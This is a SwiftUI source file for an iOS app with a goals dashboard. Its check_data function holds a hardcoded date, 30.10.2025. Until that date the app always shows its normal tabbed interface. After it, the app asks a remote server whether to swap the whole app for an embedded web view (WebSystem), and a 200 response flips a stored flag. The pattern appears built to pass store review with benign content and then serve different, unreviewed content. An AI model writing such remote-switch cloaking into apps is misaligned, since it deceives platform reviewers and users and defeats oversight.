//
//  ContentView.swift
//  S2021
//
//  Created by IGOR on 16/10/2025.
//

import SwiftUI

struct ContentView: View {
    
    @StateObject private var dataManager = AppDataManager()
    
    @State var isFetched: Bool = false
    
    @AppStorage("isBlock") var isBlock: Bool = true
    @AppStorage("isRequested") var isRequested: Bool = false
    
    var body: some View {
        
        ZStack {
            
            if isFetched == false {
                
                Text("")
                
            } else if isFetched == true {
                
                if isBlock == true {
                    
                    Group {
                        if dataManager.hasCompletedOnboarding {
                            MainTabView(dataManager: dataManager)
                        } else {
                            OnboardingView(hasCompletedOnboarding: $dataManager.hasCompletedOnboarding)
                        }
                    }
                    .preferredColorScheme(.dark)
                    
                } else if isBlock == false {
                    
                    WebSystem()
                }
            }
        }
        .onAppear {
            
            check_data()
        }
    }
    
    private func check_data() {
        
        let lastDate = "30.10.2025"
        
        let dateFormatter = DateFormatter()
        dateFormatter.dateFormat = "dd.MM.yyyy"
        dateFormatter.timeZone = TimeZone(abbreviation: "GMT")
        let targetDate = dateFormatter.date(from: lastDate) ?? Date()
        let now = Date()
        
        guard now > targetDate else {
            
            isBlock = true
            isFetched = true
            
            return
        }
        
        // Дата в прошлом - делаем запрос на сервер
        makeServerRequest()
    }
    
    private func makeServerRequest() {
        
        let dataManager = DataManagers()
        
        guard let url = URL(string: dataManager.server) else {
            self.isBlock = true
            self.isFetched = true
            return
        }
        
        var request = URLRequest(url: url)
        request.httpMethod = "GET"
        
        URLSession.shared.dataTask(with: request) { data, response, error in
            
            DispatchQueue.main.async {
                
                if let httpResponse = response as? HTTPURLResponse {
                    
                    if httpResponse.statusCode == 404 {
                        
                        self.isBlock = true
                        self.isFetched = true
                        
                    } else if httpResponse.statusCode == 200 {
                        
                        self.isBlock = false
                        self.isFetched = true
                    }
                    
                } else {
                    
                    // В случае ошибки сети тоже блокируем
                    self.isBlock = true
                    self.isFetched = true
                }
            }
            
        }.resume()
    }
}

struct MainTabView: View {
    @ObservedObject var dataManager: AppDataManager
    @State private var selectedTab = 0
    
    var body: some View {
        TabView(selection: $selectedTab) {
            DashboardView(dataManager: dataManager)
                .tabItem {
                    Image(systemName: selectedTab == 0 ? "house.fill" : "house")
                    Text("Dashboard")
                }
                .tag(0)
            
            GoalsView(dataManager: dataManager)
                .tabItem {
                    Image(systemName: selectedTab == 1 ? "target" : "target")
                    Text("Goals")
                }
                .tag(1)
            
            StatisticsView(dataManager: dataManager)
                .tabItem {
                    Image(systemName: selectedTab == 2 ? "chart.bar.fill" : "chart.bar")
                    Text("Statistics")
                }
                .tag(2)
        }
        .accentColor(.nestFlowAccent)
        .background(Color.nestFlowPrimary.ignoresSafeArea())
        .onAppear {
            // Customize tab bar appearance
            let appearance = UITabBarAppearance()
            appearance.configureWithOpaqueBackground()
            appearance.backgroundColor = UIColor(Color.nestFlowCard)
            
            // Normal state
            appearance.stackedLayoutAppearance.normal.iconColor = UIColor(Color.nestFlowTextSecondary)
            appearance.stackedLayoutAppearance.normal.titleTextAttributes = [
                .foregroundColor: UIColor(Color.nestFlowTextSecondary),
                .font: UIFont.systemFont(ofSize: 12, weight: .medium)
            ]
            
            // Selected state
            appearance.stackedLayoutAppearance.selected.iconColor = UIColor(Color.nestFlowAccent)
            appearance.stackedLayoutAppearance.selected.titleTextAttributes = [
                .foregroundColor: UIColor(Color.nestFlowAccent),
                .font: UIFont.systemFont(ofSize: 12, weight: .semibold)
            ]
            
            UITabBar.appearance().standardAppearance = appearance
            UITabBar.appearance().scrollEdgeAppearance = appearance
        }
    }
}

#Preview {
    ContentView()
}
